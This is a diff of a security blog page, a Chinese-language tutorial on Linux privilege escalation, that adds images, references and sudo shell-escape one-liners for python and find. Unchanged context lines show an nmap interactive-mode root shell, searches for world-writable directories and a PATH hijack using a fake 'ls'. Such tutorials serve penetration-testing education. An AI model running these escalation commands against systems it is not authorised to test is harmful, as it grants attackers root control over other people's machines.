@@ -112,7 +112,9 @@
 <meta property="og:site_name" content="M0rk's Blog">
 <meta property="og:description" content="Brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。 这篇文章中我们主要介绍一些常见的linux的权限提升的技巧，这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装">
 <meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/linuxprivilegeescalation.jpg">
-<meta property="og:updated_time" content="2018-11-28T07:43:59.832Z">
+<meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/python.png">
+<meta property="og:image" content="http://kevien.github.io/2017/10/10/linux权限提升/find.png">
+<meta property="og:updated_time" content="2018-11-28T10:47:58.114Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="linux权限提升">
 <meta name="twitter:description" content="Brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。 这篇文章中我们主要介绍一些常见的linux的权限提升的技巧，这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装">
@@ -402,7 +404,7 @@
 <li>以下是基本的选项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-k Enter keyword</div><div class="line">-e Enter export location</div><div class="line">-t Include thorough (lengthy) tests</div><div class="line">-r Enter report name</div><div class="line">-h Displays this help text</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="external">Unix privesc</a><br><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="external">Linprivchecker.py</a></p>
+<p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="external">Unix privesc</a><br><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="external">Linprivchecker.py</a><br><strong>这篇文章总结的比较全了</strong><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">Basic Linux Privilege Escalation</a></p>
 <h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><ul>
 <li>利用linux的内核漏洞有时可以提升我们的权限，我们需要提前测试内核explicit是否对当前的系统、架构以及内核版本是有效的。</li>
 <li>查看系统、架构、内核版本命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">uname -a</div><div class="line">cat /proc/version</div><div class="line">cat /etc/issue</div></pre></td></tr></table></figure>
@@ -457,12 +459,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">低版本的nmap3.x 有interactive模式，且设置了suid，这个时候可以进入交互模式 执行!sh 命令即可轻松完成提权。</div></pre></td></tr></table></figure>
 </li>
 <li><p>python</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo python</div><div class="line">import os</div><div class="line">os.system(&quot;/bin/bash&quot;)</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">更多参考</a></p>
+<p><img src="/2017/10/10/linux权限提升/python.png" alt=""></p>
+<ul>
+<li>find <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo find /home -exec sh -i \;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/10/linux权限提升/find.png" alt=""><br><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">更多参考</a></p>
 <h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2><ul>
-<li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。这些脚本可能是计划任务。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
+<li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。其中最常见的是计划任务脚本。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="错误的路径配置"><a href="#错误的路径配置" class="headerlink" title="错误的路径配置"></a>错误的路径配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">   这个trick不是很常见。</div><div class="line">首先这个需要受害者“错误”配置了 PATH这个环境变量，我们知道我们要在当前路径下执行某个可执行文件比如run.sh,我们需要输入 ./run.sh，有些管理员为了方便，可能会在PATH中添加.来避免输入./,这样只输入run.sh 就可以执行了。设想有这个一个场景，黑客A（地权限）和用户B（高权限），而用户B正好就设置了我们如上所说的变量，那么A可以将他的恶意程序命令为ls，而当B在进入到这个目录，并且使用ls命令查看文件属性的时候，恶意文件就会以B用户的权限去执行。这个有点儿像是欺骗攻击。</div><div class="line">[更多1](https://hackmag.com/security/reach-the-root/)</div><div class="line">[更多2](http://www.dankalia.com/tutor/01005/0100501004.htm)</div></pre></td></tr></table></figure>
@@ -486,7 +493,7 @@
 </li>
 </ul>
 <h2 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h2><p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="external">unix-privesc-check</a></p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html" target="_blank" rel="external">privilege<em>escalation</em>-_linux</a><br><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="external">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">A guide to Linux Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=-i4O_hjc87Y" target="_blank" rel="external">nmap提权</a><br><a href="https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref" target="_blank" rel="external">linux提权实战</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">guide-linux-privilege-escalation</a><br><a href="https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html" target="_blank" rel="external">privilege<em>escalation</em>-_linux</a><br><a href="http://bobao.360.cn/learning/detail/4512.html" target="_blank" rel="external">Linux提权——利用可执行文件SUID</a><br><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="external">https://github.com/sagishahar/lpeworkshop</a><br><a href="https://payatu.com/guide-linux-privilege-escalation/" target="_blank" rel="external">A guide to Linux Privilege Escalation</a><br><a href="https://www.youtube.com/watch?v=-i4O_hjc87Y" target="_blank" rel="external">nmap提权</a><br><a href="https://www.youtube.com/watch?v=dk2wsyFiosg" target="_blank" rel="external">Its Too Funky In Here04 Linux privilege escalation for fun profit and all around mischief </a><br><a href="https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref" target="_blank" rel="external">linux提权实战</a></p>
 
       
     </div>
